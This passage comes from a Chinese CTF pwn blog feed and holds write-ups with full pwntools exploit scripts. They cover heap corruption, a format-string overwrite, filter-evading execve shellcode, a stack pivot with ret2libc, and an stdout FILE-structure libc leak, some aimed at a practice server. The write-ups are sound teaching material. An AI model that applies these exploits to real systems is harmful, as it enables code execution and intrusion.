= <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;4 &#x27;</span>+<span class="hljs-built_in">index</span><br>    <span class="hljs-keyword">sl</span>(payload)<br><br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x62)#<span class="hljs-number">0</span><br><br><span class="hljs-keyword">edit</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x60+<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\xa0\x08&#x27;</span>)<br>dele(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x58)#<span class="hljs-number">0</span><br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x58)#<span class="hljs-number">1</span><br><span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">ru</span>(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>main_arena=u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">print</span>(hex(main_arena))<br>#gdb.attach(<span class="hljs-keyword">p</span>)<br><br>libc_base = main_arena -<span class="hljs-number">0</span>x219c80<br>libc=ELF(<span class="hljs-string">&quot;/home/kali/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;</span>)<br>system_addr = libc_base +libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x68)#<span class="hljs-number">2</span><br><span class="hljs-keyword">edit</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x60+p64(libc_base+<span class="hljs-number">0</span>x219058-<span class="hljs-number">0</span>x50))<br>dele(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x58)#<span class="hljs-number">2</span><br><span class="hljs-keyword">new</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x58)#<span class="hljs-number">3</span><br><span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">edit</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x50+p64(system_addr))<br><span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">p</span>.recv()<br><span class="hljs-keyword">sl</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br><br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>secert number--NEWCTF</title>
    <link href="/2024/10/23/secert%20number--NEWCTF/"/>
    <url>/2024/10/23/secert%20number--NEWCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="secert-number–NEWCTF"><a href="#secert-number–NEWCTF" class="headerlink" title="secert number–NEWCTF"></a>secert number–NEWCTF</h2><p>保护全开，主要利用格式化字符串。</p><p><img src="D:\刷题wp\picture\image-20231009201218616.png" alt="image-20231009201218616"></p><p>用时间戳做随机数种子，然后取随机数，要求猜这个随机数。</p><p>本地打法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dll=cdll<span class="hljs-selector-class">.LoadLibrary</span>(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed =<span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.time</span>()<br>a=<span class="hljs-built_in">int</span>(seed)<br>dll<span class="hljs-selector-class">.srand</span>(a)<br>secert=dll<span class="hljs-selector-class">.rand</span>()<br><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;0&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(secert)</span></span>)<br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;0&#x27;</span>)</span></span><br><span class="hljs-selector-id">#gdb</span><span class="hljs-selector-class">.attach</span>(p)<br><span class="hljs-selector-id">#pause</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(str(secert)</span></span>)<br><br></code></pre></td></tr></table></figure><p>可能是远程机子的时间戳不同，所以远程打不通。</p><p>远程打法：</p><p>这里有个循环，可以用格式化字符串先泄露出main函数的地址，然后算出pie的偏移，再根据secert在bss的地址，通过输入，利用格字进行修改secert的值。</p><p>注意：当遇到\x00会停止printf。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;1&#x27;</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">sd</span><span class="hljs-params">(b<span class="hljs-string">&#x27;%17$p&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br>main_addr = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(main_addr)</span></span>)<br>base_addr = main_addr-<span class="hljs-number">0</span>x12f5<br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><br>secert_addr = base_addr + <span class="hljs-number">0</span>x404c<br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;1&#x27;</span>)</span></span><br>payload = b<span class="hljs-string">&#x27;%9$naaaa&#x27;</span> +<span class="hljs-built_in">p64</span>(secert_addr)<br><span class="hljs-selector-id">#gdb</span><span class="hljs-selector-class">.attach</span>(p)<br><br><span class="hljs-function"><span class="hljs-title">sd</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;0&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(b<span class="hljs-string">&#x27;0&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>总结：回顾了一下对随机数的调用，以及好好看代码，注意有个循环（刚开始默认为了一次。。。）。</p><p>总exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./secretnumber&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26534</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">dll=cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="hljs-string">seed =time.time()</span><br><span class="hljs-string">a=int(seed)</span><br><span class="hljs-string">dll.srand(a)</span><br><span class="hljs-string">secert=dll.rand()</span><br><span class="hljs-string"></span><br><span class="hljs-string">sl(b&#x27;0&#x27;)</span><br><span class="hljs-string">print(hex(secert))</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sl(b&#x27;0&#x27;)</span><br><span class="hljs-string">#gdb.attach(p)</span><br><span class="hljs-string">#pause(1)</span><br><span class="hljs-string"></span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sl(str(secert))</span><br><span class="hljs-string">#sl(str(secert))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rl()<br>rl()<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>sd(<span class="hljs-string">b&#x27;%17$p&#x27;</span>)<br>rl()<br>rl()<br>main_addr = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))<br>base_addr = main_addr-<span class="hljs-number">0x12f5</span><br>rl()<br><br>secert_addr = base_addr + <span class="hljs-number">0x404c</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;%9$naaaa&#x27;</span> +p64(secert_addr)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>sd(payload)<br>rl()<br>sl(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>rl()<br>rl()<br>rl()<br>sl(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moe-shellcode检测</title>
    <link href="/2024/10/23/moe-shellcode%E6%A3%80%E6%B5%8B/"/>
    <url>/2024/10/23/moe-shellcode%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="moe-shellcode检测"><a href="#moe-shellcode检测" class="headerlink" title="moe-shellcode检测"></a>moe-shellcode检测</h2><p>shellcode中检测不能出现syscall的机器码，即‘\x0f\x05’</p><p>可以采取异或的方式来绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br>code=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">mov rdi, 0x68732f2f6e69622f</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rsp</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x3b</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">nop</span><br><span class="hljs-string">nop</span><br><span class="hljs-string">xor word ptr[rip], 0x959f</span><br><span class="hljs-string">nop</span><br><span class="hljs-string">nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm((code))<br>gdb.attach(p)<br><br>sd(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>0x9090^0x959f&#x3D;0x50f</p><p>两个nop都是0x90,异或后小端序存放为0f 05。达成执行syscall。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stack_migration--NewStarCTF(WEEK2)</title>
    <link href="/2024/10/23/NEWSTAR%20%E7%9A%84%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2024/10/23/NEWSTAR%20%E7%9A%84%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="stack-migration–NewStarCTF-WEEK2"><a href="#stack-migration–NewStarCTF-WEEK2" class="headerlink" title="stack_migration–NewStarCTF(WEEK2)"></a>stack_migration–NewStarCTF(WEEK2)</h2><p><img src="D:\刷题wp\picture\image-20231009212231723.png" alt="image-20231009212231723"></p><p>只开了NX，题目里给了栈的地址</p><p>总之，就是栈迁移啊栈迁移，还得迁移两次，还得用ret2libc。</p><p>最后看了官方WP，发现栈迁移一次就行了，libc是可以被带出来的。（不过也就当复健了一下两次的栈迁移。）</p><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-attribute">p</span>=remote(&#x27;node4.buuoj.cn&#x27;,25806)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br>main_addr =0x4011FB<br>leave_ret = 0x4012AA<br><span class="hljs-attribute">pop_ret</span>=0x000000000040101a<br>pop_rdi = 0x0000000000401333<br>puts_plt = 0x401070<br>puts_got = 0x404018<br>sl(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>rl()<br>rl()<br>rl()<br>rl()<br><span class="hljs-attribute">a</span>=rl()<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-attribute">b</span>=a[29:43]<br><span class="hljs-built_in">print</span>(b)<br>stack_addr = int(b,16)<br><span class="hljs-comment">#print(hex(stack_addr))</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)+b<span class="hljs-string">&#x27;A&#x27;</span>*(0x28)+p64(stack_addr+8)+p64(leave_ret)<br>sd(payload)<br><br>puts_addr = u64(ru(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br><span class="hljs-comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./alibc.so.6&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base +next(libc.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>sl(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>rl()<br>rl()<br>rl()<br><span class="hljs-comment">#gdb.attach(p)</span><br>payload = p64(0)+p64(pop_rdi)+p64(bin_sh)+p64(pop_ret)+p64(system_addr)+p64(main_addr)+b<span class="hljs-string">&#x27;A&#x27;</span>*(0x20)+p64(stack_addr+8-0x30)+p64(leave_ret)<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用I/O进行libc的泄露</title>
    <link href="/2024/10/23/%E5%88%A9%E7%94%A8IO%E8%BF%9B%E8%A1%8Clibc%E7%9A%84%E6%B3%84%E9%9C%B2/"/>
    <url>/2024/10/23/%E5%88%A9%E7%94%A8IO%E8%BF%9B%E8%A1%8Clibc%E7%9A%84%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="利用I-O进行libc的泄露"><a href="#利用I-O进行libc的泄露" class="headerlink" title="利用I&#x2F;O进行libc的泄露"></a>利用I&#x2F;O进行libc的泄露</h2><p>moe最后一题，无free，堆，存在索引的溢出，可以更改i&#x2F;o的结构。</p><p>先从gdb看一下FILE的基本结构</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">指令：p/x <span class="hljs-strong">*(FILE*</span>)&amp;<span class="hljs-emphasis">_IO_2_1_stdout_</span><br></code></pre></td></tr></table></figure><p><img src="D:\刷题wp\picture\image-20231021174246817.png" alt="image-20231021174246817"></p><p>_flags 的基础值一般为0xfbad0000(问就是规定的)</p><p>它被定义为MAGIC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8<span class="hljs-comment">/*不可写*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800<span class="hljs-comment">/*检查缓冲区是否为空，空则分配空间*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br></code></pre></td></tr></table></figure><p>flags是在MAGIC的基础上，经过各种与运算（为了满足或不满足一些条件）</p><p>eg：第一个判断if(MAGIC &amp; _NO_WRITES)来进行判断，如果非空，则会使得该函数不可写，也就是直接退出。 </p><p>第二个判断也是这样子，为了能够输出，要使得第二个判断为真，执行</p><p>第三个判断，主要是想不走else if 而是正常往下执行，else那里如果想要满足的话更改的量太多</p><p><img src="D:\刷题wp\picture\image-20231021175612015.png" alt="image-20231021175612015"></p><p>所以为了满足以上判断，flags&#x3D;0xfbad1800</p><p>好，接下来看题，保护全开</p><p>这里直接把flag读入到一个位置，注意那个地址的计算方式应该是&amp;puts+186972*8(因为它是指针型变量)</p><p><img src="D:\刷题wp\picture\image-20231021180146276.png" alt="image-20231021180146276"></p><p>当然，这里也可以看到，186971*8&#x3D;0x16d2e0</p><p><img src="D:\刷题wp\picture\image-20231021175921855.png" alt="image-20231021175921855"></p><p>vuln函数，只存在index的数据的反向溢出</p><p><img src="D:\刷题wp\picture\image-20231021180412282.png" alt="image-20231021180412282"></p><p>可以看到feedback_list就在bss段上，距离stdout为0x40,也就是index&#x3D;-8的区域</p><p><img src="D:\刷题wp\picture\image-20231021180510527.png" alt="image-20231021180510527"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>xfbad1800) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + b&#x27;\x00&#x27;<br></code></pre></td></tr></table></figure><p>把write_base的后两位改为00，来定向输出这些，可以看出，它是逐内存单元进行输出的。（除了定向输出，其实还有别的作用哦）</p><p><img src="D:\刷题wp\picture\image-20231021180831095.png" alt="image-20231021180831095"></p><p><img src="D:\刷题wp\picture\image-20231029190411280.png" alt="image-20231029190411280"></p><p>其实最终是为了调用这里。</p><p><img src="D:\刷题wp\picture\image-20231021181144680.png" alt="image-20231021181144680"></p><p>泄露完libc后，可以找到对应的&amp;puts是什么，然后讲put的指针</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br><span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br><span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br></code></pre></td></tr></table></figure><p>设置缓冲区为write_base -&gt; write_ptr</p><p>更改后：</p><p><img src="D:\刷题wp\picture\image-20231021184232052.png" alt="image-20231021184232052"></p><p>关于为什么第二次需要改那么多，第一次只改那么一点点的原因：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">_IO_<span class="hljs-function"><span class="hljs-title">do_write</span> (f, f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_base</span>,f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> - f-&gt;</span>_IO_write_base)<br>这个是调用的write函数，第二个参数为输出的地址，第三个为长度。<br></code></pre></td></tr></table></figure><p>长度是这两个相减。</p><p>存疑：为什么要存在ptr这个变量，为啥补直接用end-start来作为输出长度。</p><p>当正常输出的调试时，发现这里的值都不发生变化。</p><p>&#x2F;&#x2F;看了别人的文章：</p><p><img src="D:\刷题wp\picture\image-20231021190635676.png" alt="image-20231021190635676"></p><p>这里buf的空间大小size使用end-base申请的</p><p><img src="D:\刷题wp\picture\image-20231021190401369.png" alt="image-20231021190401369"></p><p>后续：</p><p><img src="D:\刷题wp\picture\image-20231021190824481.png" alt="image-20231021190824481"></p><p>最后的结果:</p><p><img src="D:\刷题wp\picture\image-20231021190843809.png" alt="image-20231021190843809"></p><p>在这一系列调用完之后，才会执行puts函数的主体，实际调用了一个IO_file_write，但这一过程中，write并没有用到file的结构体。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./feedback&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br>libc = ELF(<span class="hljs-string">&#x27;/home/kali/Desktop/libc-2.31.so&#x27;</span>)<br><br>sd(<span class="hljs-string">&#x27;-8&#x27;</span>)<br>rl()<br>payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>sl(payload)<br>stdout=u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stdout))<br>libc_base = stdout - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>flag_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>] + <span class="hljs-number">0x16d2e0</span><br><span 